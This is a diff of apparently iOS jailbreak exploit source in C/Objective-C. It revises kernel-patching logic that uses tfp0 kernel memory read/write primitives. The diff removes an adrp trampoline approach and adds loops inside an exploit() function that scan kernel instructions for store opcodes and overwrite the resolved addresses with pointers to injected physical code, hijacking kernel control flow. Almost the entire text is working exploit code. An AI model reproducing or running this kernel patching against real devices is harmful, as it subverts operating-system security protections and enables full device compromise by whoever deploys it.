@@ -71,9 +71,6 @@ void copyout(uint64_t to, void* from, size_t size) {
     mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
 }
 
-uint64_t findkext(char* identifier) {
-    return [((NSNumber*)(((__bridge NSDictionary*)OSKextCopyLoadedKextInfo(NULL, NULL))[[NSString stringWithUTF8String:identifier]][@"OSBundleLoadAddress"])) unsignedLongLongValue];
-}
 uint64_t ReadAnywhere64(uint64_t addr) {
     uint64_t val = 0;
     copyin(&val, addr, 8);
@@ -521,35 +518,47 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     uint64_t tramp_idle = findphys_real(tramp1);
     uint64_t tramp_deep = findphys_real(tramp2);
 
-    WriteAnywhere32(tramp1, 0x58000041);
-    WriteAnywhere32(tramp1+4, 0xd61f0020);
-    WriteAnywhere64(tramp1+8, physcode+0x200);
     
-    WriteAnywhere32(tramp2, 0x58000041);
-    WriteAnywhere32(tramp2+4, 0xd61f0020);
-    WriteAnywhere64(tramp2+8, physcode+0x100);
-    
-    uint32_t diff = (fref&(~0xFFF)) - (tramp_deep - gPhysBase + gVirtBase);
-    
-    
-    RemapPage(fref);
-    WriteAnywhere32(NewPointer(fref), 0x90000000 | (((diff >> 12) & 0x3) << 29) | ((diff>>14) & 0xFFFFFF) << 5 | 0xa); // adrp
-    
+    NSLog(@"%llx", fref);
 
+    /*
+     first str
+     */
     while (1) {
-        if (((ReadAnywhere32(fref) & 0x9f000000) == 0x10000000) && (ReadAnywhere32(fref) & 0x1f) == 0xb) {
+        uint32_t opcode = ReadAnywhere32(fref);
+        if ((opcode & 0xFFC00000) == 0xF9000000) {
+            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
+            int32_t myreg = (opcode >> 5) & 0x1f;
+            uint64_t rgz = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), fref-gadget_base, text_exec_base, myreg)+outhere;
+            
+            
+            WriteAnywhere64(rgz, physcode+0x200);
+            break;
+        }
+        fref += 4;
+    }
+    
+    fref += 4;
+
+    /*
+     second str
+     */
+    while (1) {
+        uint32_t opcode = ReadAnywhere32(fref);
+        if ((opcode & 0xFFC00000) == 0xF9000000) {
+            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
+            int32_t myreg = (opcode >> 5) & 0x1f;
+            uint64_t rgz = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), fref-gadget_base, text_exec_base, myreg)+outhere;
+            
+            WriteAnywhere64(rgz, physcode+0x100);
             break;
         }
         fref += 4;
     }
     
     
-    RemapPage(fref);
 
-    diff = (fref&(~0xFFF)) - (tramp_idle - gPhysBase + gVirtBase);
-    
-    WriteAnywhere32(NewPointer(fref), 0x90000000 | (((diff >> 12) & 0x3) << 29) | ((diff>>14) & 0xFFFFFF) << 5 | 0xb); // adrp
-    
+
     
     {
         /*
